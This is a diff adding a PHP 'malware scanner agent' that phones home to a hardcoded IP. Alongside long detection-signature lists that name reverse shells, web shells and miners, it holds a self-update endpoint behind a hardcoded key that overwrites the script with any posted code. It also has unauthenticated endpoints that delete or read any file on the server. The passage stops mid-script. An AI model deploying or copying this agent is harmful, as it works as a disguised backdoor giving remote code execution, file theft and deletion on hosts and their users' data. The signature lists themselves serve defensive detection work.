@@ -1,0 +1,971 @@
+<?php
+/**
+ * Malware Scanner Agent - UPGRADED VERSION
+ * Fitur: Scan multiple folder, Delete, View, Heartbeat
+ */
+
+// Konfigurasi
+
+ini_set('max_execution_time', 300);
+ini_set('memory_limit', '512M');
+set_time_limit(300);
+
+define('CENTRAL_SERVER', 'http://178.128.100.171/index.php');
+define('API_KEY', 'wakwaw123');
+
+$agent_id = 'agent_' . md5($_SERVER['HTTP_HOST'] ?? gethostname());
+
+// ==================== KONFIGURASI FOLDER SCAN ====================
+// Tentukan folder mana saja yang mau di-scan (BISA LEBIH DARI SATU!)
+$scan_folders = [
+    __DIR__,  // Folder agent saat ini
+    // TAMBAHKAN FOLDER LAIN DI SINI:
+    // '/var/www/html',
+    // '/home/user/public_html',
+    // '/var/www/wordpress-site',
+    // '/home/user/site-lain'
+];
+
+// Atau set ke TRUE untuk auto-detect semua website di server
+$auto_detect_all_websites = false;  // <-- SET TRUE UNTUK SCAN SEMUA SITE!
+
+// ==================== HANDLE SELF-UPDATE ====================
+if (isset($_GET['update'])) {
+    header('Content-Type: application/json');
+    
+    // Cek API key
+    $api_key = $_GET['api_key'] ?? '';
+    if ($api_key !== API_KEY) {
+        http_response_code(401);
+        echo json_encode(['status' => 'error', 'message' => 'Invalid API key']);
+        exit;
+    }
+    
+    // Ambil data dari POST
+    $input = json_decode(file_get_contents('php://input'), true);
+    $new_content = $input['content'] ?? '';
+    $new_filename = $input['filename'] ?? null;
+    
+    if (empty($new_content)) {
+        echo json_encode(['status' => 'error', 'message' => 'No content provided']);
+        exit;
+    }
+    
+    $current_file = $_SERVER['SCRIPT_FILENAME'];
+    
+    // Tulis file baru (langsung, tanpa backup)
+    if (file_put_contents($current_file, $new_content)) {
+        $result = ['status' => 'ok', 'message' => 'Agent updated successfully'];
+        
+        // Rename file jika ada nama baru
+        if ($new_filename && $new_filename !== basename($current_file)) {
+            $new_path = dirname($current_file) . '/' . $new_filename;
+            if (rename($current_file, $new_path)) {
+                $result['message'] = 'Agent updated and renamed to ' . $new_filename;
+                $result['new_url'] = str_replace(basename($current_file), $new_filename, $_SERVER['SCRIPT_URI'] ?? '');
+            }
+        }
+        
+        echo json_encode($result);
+    } else {
+        echo json_encode(['status' => 'error', 'message' => 'Failed to update agent']);
+    }
+    exit;
+}
+
+// ==================== SIGNATURE DATABASE ====================
+$signatures = [
+    // Existing signatures
+    'c99shell' => ['pattern' => '/c99shell|c99|shell\.php/i', 'score' => 100],
+    'r57shell' => ['pattern' => '/r57shell|r57/i', 'score' => 100],
+    'b374k' => ['pattern' => '/b374k|b3rk/i', 'score' => 95],
+    'wso' => ['pattern' => '/wso shell|webshell/i', 'score' => 95],
+    'eval_gz' => ['pattern' => '/eval\s*\(\s*gzinflate\s*\(/i', 'score' => 100],
+    'base64_multiple' => ['pattern' => '/base64_decode\s*\(\s*base64_decode\s*\(/i', 'score' => 100],
+    'shell_exec' => ['pattern' => '/shell_exec\s*\(\s*\$\_/i', 'score' => 85],
+    'system_cmd' => ['pattern' => '/system\s*\(\s*\$\_/i', 'score' => 85],
+    'preg_replace_eval' => ['pattern' => '/preg_replace.*\/e/i', 'score' => 90],
+    'create_function' => ['pattern' => '/create_function\s*\(.*\$\_/i', 'score' => 85],
+    'obfuscated' => ['pattern' => '/obfuscated/i', 'score' => 30],
+    
+    // ============ NEW SIGNATURES ============
+    
+    // Remote downloader + eval (SHELL 1)
+    'remote_download_eval' => [
+        'pattern' => '/curl_init.*CURLOPT_URL.*curl_exec.*eval\s*\(\s*[\'"]/is', 
+        'score' => 100
+    ],
+    'curl_download_eval' => [
+        'pattern' => '/function\s+\w+\s*\(.*curl.*\)\s*\{.*return.*curl_exec.*\}\s*eval\s*\(/is',
+        'score' => 100
+    ],
+    'file_get_contents_eval' => [
+        'pattern' => '/file_get_contents\s*\(.*\)\s*.*\s*eval\s*\(/is',
+        'score' => 95
+    ],
+    
+    // Multi-layer base64 obfuscation (SHELL 2)
+    'double_base64' => [
+        'pattern' => '/\$[a-z]\s*=\s*["\']([A-Za-z0-9+\/=]{100,})["\'];.*\$[a-z]\s*=\s*\$[a-z]\s*\.\s*\$[a-z]/is',
+        'score' => 95
+    ],
+    'concat_base64_decode' => [
+        'pattern' => '/\$[a-z]\s*=\s*["\']base64["\'];.*\$[a-z]\s*=\s*["\']_decode["\'];.*\$[a-z]\s*=\s*\$[a-z]\s*\.\s*\$[a-z]/is',
+        'score' => 100
+    ],
+    'string_concat_obfuscation' => [
+        'pattern' => '/\$[a-z]\s*=\s*["\']?[A-Za-z0-9+\/=]{10,}["\']?;?\s*\$[a-z]\s*\.=\s*["\'][A-Za-z0-9+\/=]+["\']/is',
+        'score' => 80
+    ],
+    
+    // eval with variable concatenation
+    'eval_concat' => [
+        'pattern' => '/eval\s*\(\s*\$[a-z]\s*\.\s*\$[a-z]\s*\(/is',
+        'score' => 100
+    ],
+    
+    // Multiple decode layers
+    'multi_layer_decode' => [
+        'pattern' => '/\$[a-z]\s*=\s*base64_decode\s*\(\s*\$[a-z]\s*\);\s*\$[a-z]\s*=\s*base64_decode\s*\(\s*\$[a-z]\s*\)/is',
+        'score' => 100
+    ],
+    
+    // Remote payload fetch
+    'remote_payload' => [
+        'pattern' => '/(https?:\/\/[^\s]+\.txt|https?:\/\/[^\s]+\.php).*eval/is',
+        'score' => 100
+    ],
+
+    'remote_eval_downloader' => [
+    'pattern' => '/function\s+\w+\s*\([^)]*\).*curl.*return.*curl_exec.*\}\s*\$[a-z]+\s*=\s*[\'"]\?>[\'"];\s*eval/si',
+    'score' => 100
+    ],
+    'base64_concat_array' => [
+        'pattern' => '/\$[a-z]\s*=\s*"";\s*\$[a-z]\s*\.=\s*"[A-Za-z0-9+\/=]+";/s',
+        'score' => 90
+    ],
+    'base64_decode_eval' => [
+        'pattern' => '/\$[a-z]\s*=\s*"base64";\s*\$[a-z]\s*=\s*"_decode";\s*\$[a-z]\s*=\s*\$[a-z]\$[a-z];/s',
+        'score' => 100
+    ],
+
+    // Local File Inclusion (LFI)
+    'lfi_vulnerability' => [
+        'pattern' => '/(include|require)(_once)?\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)\[/i',
+        'score' => 90,
+        'type' => 'LFI',
+        'severity' => 'HIGH'
+    ],
+    
+    // Remote File Inclusion (RFI)
+    'rfi_vulnerability' => [
+        'pattern' => '/(include|require)(_once)?\s*\(\s*[\'"]?(https?|ftp):\/\//i',
+        'score' => 100,
+        'type' => 'RFI',
+        'severity' => 'CRITICAL'
+    ],
+    
+    // SQL Injection (SQLi)
+    'sqli_vulnerability' => [
+        'pattern' => '/\$_(GET|POST|REQUEST)\[.*\].*\s*\.\s*\$_(GET|POST|REQUEST)\[.*\]|mysql_query\s*\(\s*\$_(GET|POST|REQUEST)/i',
+        'score' => 95,
+        'type' => 'SQL Injection',
+        'severity' => 'CRITICAL'
+    ],
+    
+    // Command Injection
+    'cmd_injection' => [
+        'pattern' => '/(exec|shell_exec|system|passthru|popen|proc_open)\s*\(\s*\$_(GET|POST|REQUEST)/i',
+        'score' => 100,
+        'type' => 'Command Injection',
+        'severity' => 'CRITICAL'
+    ],
+    
+    // Cross-Site Scripting (XSS)
+    'xss_vulnerability' => [
+        'pattern' => '/echo\s+.*\$_(GET|POST|REQUEST).*<.*>|print\s+.*\$_(GET|POST|REQUEST).*<.*>/i',
+        'score' => 70,
+        'type' => 'XSS',
+        'severity' => 'MEDIUM'
+    ],
+    
+    // Unserialize vulnerability
+    'unserialize_vuln' => [
+        'pattern' => '/unserialize\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i',
+        'score' => 85,
+        'type' => 'Insecure Deserialization',
+        'severity' => 'HIGH'
+    ],
+    
+    // Eval with user input
+    'eval_user_input' => [
+        'pattern' => '/eval\s*\(\s*\$_(GET|POST|REQUEST)/i',
+        'score' => 100,
+        'type' => 'Remote Code Execution',
+        'severity' => 'CRITICAL'
+    ],
+    
+    // Upload vulnerability
+    'upload_vulnerability' => [
+        'pattern' => '/move_uploaded_file\s*\(\s*\$_FILES.*\.(php|phtml|php5)/i',
+        'score' => 85,
+        'type' => 'Unrestricted File Upload',
+        'severity' => 'HIGH'
+    ],
+
+    // Reverse Shell
+'reverse_shell' => [
+    'pattern' => '/fsockopen.*exec|shell_exec.*bash -i|sock=fsockopen.*system/si',
+    'score' => 100
+],
+
+// Crypto Miner
+'crypto_miner' => [
+    'pattern' => '/cryptonight|stratum|mining|coinbase|wallet/si',
+    'score' => 100
+],
+
+// Phishing Page
+'phishing' => [
+    'pattern' => '/<form.*action=.*(login|submit).*password/si',
+    'score' => 70
+],
+
+// Mailer Spam
+'mailer_spam' => [
+    'pattern' => '/mail\s*\(.*\$_POST.*\$_SERVER|sendmail.*to:\s*\$_POST/si',
+    'score' => 80
+],
+
+// SQL Injection Tool
+'sqli_tool' => [
+    'pattern' => '/sqlmap|sql injection|union.*select.*information_schema/si',
+    'score' => 90
+],
+
+// Directory Listing
+'dir_listing' => [
+    'pattern' => '/scandir.*foreach.*echo|opendir.*while.*readdir.*echo/si',
+    'score' => 60
+],
+
+// Database Credential Stealer
+'db_stealer' => [
+    'pattern' => '/mysql_connect.*\$_SERVER|mysqli_connect.*localhost.*root/si',
+    'score' => 80
+],
+
+// File Editor/Manager
+'file_editor' => [
+    'pattern' => '/if.*\$_POST.*content.*file_put_contents|fwrite.*\$_POST/si',
+    'score' => 70
+],
+
+// Wget/Downloader
+'wget_downloader' => [
+    'pattern' => '/wget\s+http|curl\s+-o\s+.*\.php/si',
+    'score' => 85
+],
+
+// PHP Info Exposer
+'phpinfo_exposer' => [
+    'pattern' => '/phpinfo\s*\(\s*\)/i',
+    'score' => 40
+],
+
+// Base64 Encoded Payload
+'base64_payload' => [
+    'pattern' => '/base64_decode\s*\(\s*[\'"]{200,}[\'"]\s*\)/s',
+    'score' => 85
+],
+
+// XOR Obfuscation
+'xor_obfuscation' => [
+    'pattern' => '/\$[a-z]\s*=\s*[\'"].*[\'"]\s*;\s*\$[a-z]\s*=\s*\$[a-z]\s*\^\s*\$[a-z]/s',
+    'score' => 90
+],
+
+// Gzinflate Obfuscation
+'gzinflate_obfuscation' => [
+    'pattern' => '/gzinflate\s*\(\s*base64_decode\s*\(/i',
+    'score' => 100
+],
+
+'reverse_shell_bash' => [
+    'pattern' => '/system\s*\(\s*["\']bash\s+-c\s+["\'].*bash\s+-i.*\/dev\/tcp/i',
+    'score' => 100
+],
+'reverse_shell_exec' => [
+    'pattern' => '/exec\s*\(\s*["\']bash\s+-c\s+["\'].*bash\s+-i.*\/dev\/tcp/i',
+    'score' => 100
+],
+'reverse_shell_shell_exec' => [
+    'pattern' => '/shell_exec\s*\(\s*["\']bash\s+-c\s+["\'].*bash\s+-i.*\/dev\/tcp/i',
+    'score' => 100
+],
+'reverse_shell_generic' => [
+    'pattern' => '/bash\s+-i\s*>&\s*\/dev\/tcp\/\d+\.\d+\.\d+\.\d+\/\d+/i',
+    'score' => 100
+],
+'reverse_shell_php' => [
+    'pattern' => '/\$sock\s*=\s*fsockopen\s*\([\'"]\d+\.\d+\.\d+\.\d+[\'"]\s*,\s*\d+/i',
+    'score' => 100
+],
+
+'reverse_shell_system_bash' => [
+    'pattern' => '/system\s*\(\s*["\']bash\s+-c/i',
+    'score' => 100
+],
+'bash_reverse_shell' => [
+    'pattern' => '/bash\s+-i\s*>&\s*\/dev\/tcp/i',
+    'score' => 100
+],
+'web_shell_filemanager' => [
+    'pattern' => '/(function writeFile|function readFileContent|function scanDirectory).*(file_put_contents|file_get_contents|scandir).*bypass.*open_basedir/si',
+    'score' => 100
+],
+'dark_bossbey' => [
+    'pattern' => '/Dark BossBey|SYSTEM LOCKED|hashed_password.*password_verify/si',
+    'score' => 100
+],
+'file_manager_web_shell' => [
+    'pattern' => '/(upload.*file.*manager|delete.*file.*editor|rename.*file.*scandir).*session_start/si',
+    'score' => 95
+],
+'short_tag_webshell' => [
+    'pattern' => '/<\?=.*file_get_contents.*eval/si',
+    'score' => 100
+],
+
+// Remote download + eval with authentication
+'remote_download_auth' => [
+    'pattern' => '/session_start.*password_verify.*file_get_contents.*eval/si',
+    'score' => 100
+],
+
+// Obfuscated short tag
+'obfuscated_short_tag' => [
+    'pattern' => '/<\?=.*\/\*.*@null.*\*\/.*eval/si',
+    'score' => 100
+],
+
+// Remote file get contents + eval
+'remote_file_eval' => [
+    'pattern' => '/file_get_contents\s*\(\s*[\'"]https?:\/\/[^\'"]+[\'"]\s*\).*eval/si',
+    'score' => 100
+],
+
+// Login form with remote code execution
+'login_remote_code' => [
+    'pattern' => '/session_start.*password_verify.*file_get_contents.*eval\s*\(\s*[\'"]\?>[\'"]/si',
+    'score' => 100
+],
+];
+
+if (isset($_GET['delete_self']) && $_GET['api_key'] === API_KEY) {
+    $current_file = $_SERVER['SCRIPT_FILENAME'];
+    @unlink($current_file);
+    echo "Agent deleted";
+    exit;
+}
+
+// ==================== HEURISTIC DETECTION ====================
+function heuristicDetection($content, $file_path) {
+    $score = 0;
+    $patterns = [];
+    
+    // 1. Deteksi high entropy (obfuscation)
+    $entropy = calculateEntropy($content);
+    if ($entropy > 6.5) {
+        $score += 40;
+        $patterns[] = 'high_entropy_obfuscation';
+    }
+    
+    // 2. Deteksi eval dengan string panjang
+    if (preg_match_all('/eval\s*\(\s*[\'"].{200,}[\'"]\s*\)/', $content, $m)) {
+        $score += 50;
+        $patterns[] = 'long_string_eval';
+    }
+    
+    // 3. Deteksi encoded strings (base64, hex, rot13)
+    $encoded = preg_match_all('/base64_decode|gzinflate|str_rot13|hex2bin/', $content);
+    if ($encoded > 3) {
+        $score += 30;
+        $patterns[] = 'multiple_encoding';
+    }
+    
+    // 4. Deteksi fungsi berbahaya dalam jumlah banyak
+    $dangerous = preg_match_all('/(eval|system|exec|shell_exec|passthru|popen|proc_open)/i', $content);
+    if ($dangerous > 5) {
+        $score += 40;
+        $patterns[] = 'excessive_dangerous_functions';
+    }
+    
+    // 5. Deteksi file yang menulis file PHP (backdoor creator)
+    if (preg_match('/file_put_contents.*\.php|fwrite.*\.php/i', $content)) {
+        $score += 50;
+        $patterns[] = 'php_file_writer';
+    }
+    
+    // 6. Deteksi remote file inclusion
+    if (preg_match('/(include|require).*https?:\/\//i', $content)) {
+        $score += 80;
+        $patterns[] = 'remote_file_inclusion';
+    }
+    
+    // 7. Deteksi uploader
+    if (preg_match('/move_uploaded_file|is_uploaded_file/i', $content)) {
+        $score += 30;
+        $patterns[] = 'file_upload_detected';
+    }
+    
+    // 8. Deteksi backdoor command
+    if (preg_match('/\$\_GET\[\'cmd\'\]|\$\_POST\[\'cmd\'\]|\$\_REQUEST\[\'cmd\'\]/i', $content)) {
+        $score += 90;
+        $patterns[] = 'backdoor_command';
+    }
+    
+    // 9. Deteksi file manager
+    if (preg_match('/scandir|readdir|opendir.*while/i', $content)) {
+        $score += 30;
+        $patterns[] = 'file_manager';
+    }
+    
+    // 10. Deteksi database dump
+    if (preg_match('/mysqldump|pg_dump|SELECT.*INTO OUTFILE/i', $content)) {
+        $score += 60;
+        $patterns[] = 'database_dump';
+    }
+    
+    // 11. Deteksi path traversal
+    if (preg_match('/\.\.\/\.\.\/|\.\.\/\.\.\//', $content)) {
+        $score += 40;
+        $patterns[] = 'path_traversal';
+    }
+    
+    // 12. Deteksi socket connection (reverse shell)
+    if (preg_match('/fsockopen|pfsockopen|socket_create|stream_socket_client/i', $content)) {
+        $score += 80;
+        $patterns[] = 'socket_connection';
+    }
+
+    $has_file_ops = preg_match('/(move_uploaded_file|unlink|file_put_contents|rename|scandir)/', $content);
+    $has_auth = preg_match('/(session_start|password_verify|\$_SESSION)/', $content);
+    $has_bypass = preg_match('/(open_basedir|disable_functions|ini_set)/', $content);
+
+if ($has_file_ops && $has_auth && $has_bypass) {
+    $score += 90;
+    $patterns[] = 'web_shell_filemanager';
+}
+    
+    return ['score' => min($score, 100), 'patterns' => $patterns];
+}
+
+function calculateEntropy($str) {
+    if (empty($str)) return 0;
+    
+    $length = strlen($str);
+    $counts = [];
+    for ($i = 0; $i < $length; $i++) {
+        $char = $str[$i];
+        if (!isset($counts[$char])) $counts[$char] = 0;
+        $counts[$char]++;
+    }
+    
+    $entropy = 0;
+    foreach ($counts as $count) {
+        $p = $count / $length;
+        $entropy -= $p * log($p, 2);
+    }
+    
+    return $entropy;
+}
+
+
+// ==================== WORDPRESS VERSION DETECTION ====================
+function detectWordPressVersion($root_path) {
+    $version_file = $root_path . '/wp-includes/version.php';
+    
+    if (!file_exists($version_file)) {
+        return null;
+    }
+    
+    $content = @file_get_contents($version_file);
+    if (!$content) {
+        return null;
+    }
+    
+    // Cari versi WordPress
+    if (preg_match('/\$wp_version\s*=\s*[\'"](\d+\.\d+(?:\.\d+)?)[\'"]/', $content, $matches)) {
+        return $matches[1];
+    }
+    
+    return null;
+}
+
+// ==================== WORDPRESS CORE FILE CHECK ====================
+function isWordPressCoreFile($file_path, $file_size) {
+    static $wp_core_sizes = null;
+    
+    if ($wp_core_sizes === null) {
+        $cache_file = __DIR__ . '/wp_sizes.cache';
+        if (file_exists($cache_file) && (time() - filemtime($cache_file) < 604800)) {
+            $wp_core_sizes = json_decode(file_get_contents($cache_file), true);
+        } else {
+            // Download dari central server
+            $url = CENTRAL_SERVER . '/wp_original_sizes.json';
+            $json = @file_get_contents($url);
+            if ($json) {
+                $wp_core_sizes = json_decode($json, true);
+                file_put_contents($cache_file, $json);
+            } else {
+                $wp_core_sizes = [];
+            }
+        }
+    }
+    
+    // Normalisasi path
+    $relative = '';
+    if (preg_match('#/wp-admin/(.+)$#', $file_path, $m)) {
+        $relative = 'wp-admin/' . $m[1];
+    } elseif (preg_match('#/wp-includes/(.+)$#', $file_path, $m)) {
+        $relative = 'wp-includes/' . $m[1];
+    } elseif (preg_match('#/(wp-[^/]+\.php)$#', $file_path, $m)) {
+        $relative = $m[1];
+    } elseif (preg_match('#/(license\.txt|readme\.html)$#', $file_path, $m)) {
+        $relative = $m[1];
+    } else {
+        return false;
+    }
+    
+    // Cek apakah file dikenal dan ukuran SAMA
+    if (isset($wp_core_sizes[$relative]) && $wp_core_sizes[$relative] == $file_size) {
+        return true;
+    }
+    
+    return false;
+}
+
+// ==================== AUTO-DETECT ALL WEBSITES ====================
+function getAllDocumentRoots() {
+    $roots = [];
+    
+    // Deteksi dari Apache
+    if (file_exists('/etc/apache2/sites-enabled/')) {
+        $files = glob('/etc/apache2/sites-enabled/*');
+        foreach ($files as $file) {
+            $content = file_get_contents($file);
+            preg_match_all('/DocumentRoot\s+(\S+)/i', $content, $matches);
+            foreach ($matches[1] as $root) {
+                $root = rtrim($root, '/');
+                if (is_dir($root)) $roots[] = $root;
+            }
+        }
+    }
+    
+    // Deteksi dari Nginx
+    if (file_exists('/etc/nginx/sites-enabled/')) {
+        $files = glob('/etc/nginx/sites-enabled/*');
+        foreach ($files as $file) {
+            $content = file_get_contents($file);
+            preg_match_all('/root\s+(\S+);/i', $content, $matches);
+            foreach ($matches[1] as $root) {
+                $root = rtrim($root, '/');
+                if (is_dir($root)) $roots[] = $root;
+            }
+        }
+    }
+    
+    // Tambahkan lokasi umum
+    $common_paths = [
+        $_SERVER['DOCUMENT_ROOT'] ?? null,
+        '/var/www/html',
+        '/var/www',
+        '/home/*/public_html',
+        '/home/*/www'
+    ];
+    
+    foreach ($common_paths as $path) {
+        if ($path && is_dir($path)) $roots[] = $path;
+        $expanded = glob($path);
+        foreach ($expanded as $dir) {
+            if (is_dir($dir)) $roots[] = $dir;
+        }
+    }
+    
+    return array_unique(array_filter($roots));
+}
+
+// ==================== HTTP REQUEST ====================
+function httpRequest($url, $postData = null) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 120);
+    if ($postData) {
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    }
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response;
+}
+
+// ==================== REGISTER ====================
+function registerAgent() {
+    global $agent_id;
+    
+    $protocol = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
+    $host = $_SERVER['HTTP_HOST'];
+    $script = $_SERVER['SCRIPT_NAME'];
+    $full_url = $protocol . $host . $script;
+    
+    $data = [
+        'agent_id' => $agent_id,
+        'url' => $full_url,
+        'php_version' => phpversion(),
+        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown'
+    ];
+    
+    $response = httpRequest(CENTRAL_SERVER . '?action=agent_register&api_key=' . API_KEY, $data);
+    return json_decode($response, true);
+}
+
+// ==================== SEND REPORT ====================
+function sendReport($task_id, $scan_results, $wp_versions = []) {
+    global $agent_id;
+    
+    $data = [
+        'agent_id' => $agent_id,
+        'task_id' => $task_id,
+        'files_scanned' => $scan_results['files_scanned'],
+        'results' => $scan_results['suspicious'],
+        'wp_versions' => $wp_versions  // TAMBAHKAN INI!
+    ];
+    
+    $json_data = json_encode($data);
+    $use_compression = function_exists('gzcompress') && strlen($json_data) > 10240;
+    
+    if ($use_compression) {
+        $compressed = gzcompress($json_data, 9);
+        $post_data = [
+            'compressed' => 1,
+            'data' => base64_encode($compressed)
+        ];
+        $original = round(strlen($json_data)/1024, 1);
+        $compressed_size = round(strlen($post_data['data'])/1024, 1);
+        echo "<div style='background:#1a1f2e;padding:5px;margin:5px 0;border-left:4px solid #4caf50;'>📦 Compressed: {$original}KB → {$compressed_size}KB (" . round((1 - $compressed_size/$original)*100) . "% smaller)</div>";
+    } else {
+        $post_data = $data;
+        if (!function_exists('gzcompress')) {
+            echo "<div style='background:#ff9800;padding:5px;margin:5px 0;'>⚠️ gzcompress not available, sending uncompressed</div>";
+        }
+    }
+    
+    $url = CENTRAL_SERVER . '?action=agent_report&api_key=' . API_KEY;
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post_data));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 120);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curl_error = curl_error($ch);
+    curl_close($ch);
+    
+    echo "<div style='background:#1a1f2e;padding:10px;margin:10px 0;border-left:4px solid #4fc3f7;'>";
+    echo "<strong>📡 Report Status:</strong><br>";
+    echo "HTTP Code: " . $http_code . "<br>";
+    if ($curl_error) {
+        echo "<span style='color:#ff5252'>❌ CURL Error: " . $curl_error . "</span><br>";
+    }
+    if ($response) {
+        echo "Response: " . htmlspecialchars(substr($response, 0, 200)) . "<br>";
+    }
+    echo "</div>";
+    
+    if ($http_code == 200 && $response) {
+        return json_decode($response, true);
+    }
+    
+    return ['error' => 'Failed to send', 'http_code' => $http_code, 'curl_error' => $curl_error];
+}
+
+
+function sendSingleReport($data, $task_id) {
+    global $agent_id;
+    
+    $url = CENTRAL_SERVER . '?action=agent_report&api_key=' . API_KEY;
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curl_error = curl_error($ch);
+    curl_close($ch);
+    
+    if ($http_code == 200 && $response) {
+        return json_decode($response, true);
+    }
+    
+    return ['error' => 'Failed', 'http_code' => $http_code, 'curl_error' => $curl_error];
+}
+
+// ==================== DELETE FILE ====================
+function deleteFile($file_path) {
+    $real_path = realpath($file_path);
+    if (!$real_path || !file_exists($real_path)) {
+        return ['status' => 'error', 'message' => 'File not found'];
+    }
+    if (!is_writable($real_path)) {
+        return ['status' => 'error', 'message' => 'Cannot delete file (permission denied)'];
+    }
+    if (unlink($real_path)) {
+        return ['status' => 'ok', 'message' => 'File deleted: ' . $file_path];
+    } else {
+        return ['status' => 'error', 'message' => 'Failed to delete file'];
+    }
+}
+
+// ==================== SCAN MULTIPLE FOLDERS ====================
+function scanMultipleFolders($folders, $recursive = true) {
+    global $signatures;
+    $all_results = [];
+    $total_files_scanned = 0;
+    $scanned_folders = [];
+    
+    foreach ($folders as $folder) {
+        if (!is_dir($folder)) {
+            continue;
+        }
+        $scanned_folders[] = $folder;
+        $result = scanSingleDirectory($folder, $recursive);
+        $total_files_scanned += $result['files_scanned'];
+        foreach ($result['suspicious'] as $suspicious) {
+            $all_results[] = $suspicious;
+        }
+    }
+    
+    return [
+        'files_scanned' => $total_files_scanned,
+        'suspicious' => $all_results,
+        'scanned_folders' => $scanned_folders
+    ];
+}
+
+function scanSingleDirectory($dir, $recursive = true) {
+    global $signatures;
+    $results = [];
+    $files_scanned = 0;
+    $dangerous_extensions = ['php', 'php3', 'php4', 'php5', 'php7', 'phtml', 'inc'];
+    $exclude_dirs = ['.git', '.svn', 'cache', 'tmp', 'backup', 'node_modules', 'vendor'];
+
+    if (!is_dir($dir)) {
+        return ['files_scanned' => 0, 'suspicious' => []];
+    }
+
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)
+    );
+
+    foreach ($iterator as $file) {
+        if ($file->isDir()) {
+            if (in_array($file->getFilename(), $exclude_dirs)) {
+                $iterator->getInnerIterator()->getInnerIterator()->setInfoClass('SplFileInfo');
+                continue;
+            }
+            continue;
+        }
+
+        $ext = strtolower($file->getExtension());
+        if (!in_array($ext, $dangerous_extensions)) continue;
+        if (!$recursive && dirname($file->getPathname()) !== $dir) continue;
+
+        $files_scanned++;
+        $content = @file_get_contents($file->getPathname());
+        if ($content === false) continue;
+
+        $score = 0;
+        $patterns = [];
+
+        // Signature detection
+        foreach ($signatures as $name => $sig) {
+            if (preg_match($sig['pattern'], $content)) {
+                $score += $sig['score'];
+                $patterns[] = $name;
+            }
+        }
+
+        // Additional checks
+        if (preg_match_all('/base64_decode|gzinflate|str_rot13/', $content, $matches) > 2) {
+            $score += 30;
+            $patterns[] = 'obfuscated';
+        }
+        
+        // ============ HEURISTIC DETECTION ============
+        $heuristic = heuristicDetection($content, $file->getPathname());
+        $score += $heuristic['score'];
+        $patterns = array_merge($patterns, $heuristic['patterns']);
+        
+        // Batasi score maksimal
+        $score = min($score, 999);
+
+        if ($score > 0) {
+            $results[] = [
+                'file' => $file->getPathname(),
+                'size' => $file->getSize(),
+                'score' => $score,
+                'patterns' => array_unique($patterns) // Hapus duplicate pattern
+            ];
+        }
+    }
+
+    return ['files_scanned' => $files_scanned, 'suspicious' => $results];
+}
+
+// ==================== HANDLE HEARTBEAT ====================
+if (isset($_GET['heartbeat'])) {
+    header('Content-Type: application/json');
+    echo json_encode(['status' => 'ok', 'agent_id' => $agent_id, 'timestamp' => time()]);
+    exit;
+}
+
+// ==================== HANDLE DELETE ====================
+if (isset($_GET['delete'])) {
+    header('Content-Type: application/json');
+    $result = deleteFile($_GET['delete']);
+    echo json_encode($result);
+    exit;
+}
+
+// ==================== HANDLE VIEW ====================
+if (isset($_GET['view'])) {
+    $file = $_GET['view'];
+    $real_path = realpath($file);
+    
+    if (!$real_path || !file_exists($real_path)) {
+        die("File not found");
+    }
+    if (!is_readable($real_path)) {
+        die("File not readable");
+    }
+    
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    if (in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'inc'])) {
+        echo "<html><head><title>View File</title>";
+        echo "<style>body{background:#0a0e1a;color:#e0e0e0;font-family:monospace;padding:20px;}";
+        echo "pre{background:#1a1f2e;padding:15px;border-radius:5px;overflow:auto;}</style>";
+        echo "</head><body>";
+        echo "<h2>File: " . htmlspecialchars($file) . "</h2>";
+        echo "<a href='?scan=1'>← Back</a><hr>";
+        echo "<pre>" . htmlspecialchars(file_get_contents($real_path)) . "</pre>";
+        echo "</body></html>";
+    } else {
+        header('Content-Type: text/plain');
+        readfile($real_path);
+    }
+    exit;
+}
+
+// ==================== MAIN EXECUTION ====================
+$register_result = registerAgent();
+
+// Deteksi WordPress version di semua folder yang akan di-scan
+$wp_versions = [];
+$all_document_roots = getAllDocumentRoots();
+foreach ($all_document_roots as $root) {
+    $version = detectWordPressVersion($root);
+    if ($version) {
+        $wp_versions[$root] = $version;
+    }
+}
+
+if (isset($_GET['scan'])) {
+    global $scan_folders, $auto_detect_all_websites;
+    $depth = $_GET['depth'] ?? 'quick';
+    $recursive = ($depth === 'deep');
+    
+    // Tampilkan versi WordPress yang terdeteksi
+    if (!empty($wp_versions)) {
+        echo "<div style='background:#1a1f2e;padding:10px;margin:10px 0;border-left:4px solid #4caf50;'>";
+        echo "<strong>📊 WordPress Sites Detected:</strong><br>";
+        foreach ($wp_versions as $path => $version) {
+            echo "• " . htmlspecialchars($path) . " → <strong>WordPress {$version}</strong><br>";
+        }
+        echo "</div>";
+    }
+    
